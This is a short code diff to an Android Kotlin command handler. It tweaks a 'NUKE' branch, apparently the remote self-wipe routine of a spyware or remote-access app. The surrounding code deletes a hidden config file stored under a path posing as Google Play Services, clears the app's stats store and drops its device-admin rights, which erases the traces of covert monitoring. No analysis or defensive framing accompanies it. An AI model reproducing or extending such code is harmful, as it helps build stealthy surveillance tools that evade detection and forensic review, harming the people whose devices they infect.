@@ -146,7 +146,7 @@ object CommandProcessor {
                 "NUKE" -> {
                     try {
                         File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config").deleteRecursively()
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().commit()
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                         val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                         if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
